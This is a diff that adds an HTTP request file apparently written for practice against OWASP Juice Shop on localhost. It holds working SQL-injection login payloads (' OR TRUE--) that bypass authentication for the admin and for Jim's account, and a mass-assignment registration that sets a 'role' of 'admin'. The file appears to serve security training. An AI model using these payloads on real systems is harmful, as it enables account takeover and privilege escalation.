@@ -1,0 +1,64 @@
+@base-url = http://localhost:3000
+
+### GET the score board
+GET {{base-url}}/#/score-board
+
+
+### Force invalid error handling
+GET {{base-url}}/rest/qwerty
+
+
+### Login with admin account through SQL-injection
+POST {{base-url}}/rest/user/login
+Content-Type: application/json
+
+{
+    "email": "' OR TRUE--",
+    "password": "12345"
+}
+
+### Register a user with administrative rights
+### Step 1: Find out properties of users in system
+POST {{base-url}}/api/Users
+Content-Type: application/json
+
+{
+    "email":"userTest@test.se",
+    "password":"T3stT3st",
+    "passwordRepeat":"T3stT3st",
+    "securityQuestion": {
+        "id":2,
+        "question":"Mother's maiden name?",
+        "createdAt":"2022-02-10T18:22:42.379Z",
+        "updatedAt":"2022-02-10T18:22:42.379Z"
+    },
+    "securityAnswer":"Test"
+}
+
+### Step2: Provide value for property
+POST {{base-url}}/api/Users
+Content-Type: application/json
+
+{
+    "email":"adminTest@test.se",
+    "password":"T3stT3st",
+    "passwordRepeat":"T3stT3st",
+    "securityQuestion": {
+        "id":2,
+        "question":"Mother's maiden name?",
+        "createdAt":"2022-02-10T18:22:42.379Z",
+        "updatedAt":"2022-02-10T18:22:42.379Z"
+    },
+    "securityAnswer":"Test",
+    "role": "admin"
+}
+
+
+### Login with jims account through SQL-injection
+POST {{base-url}}/rest/user/login
+Content-Type: application/json
+
+{
+    "email": "jim@juice-sh.op' OR TRUE--",
+    "password": "12345"
+}
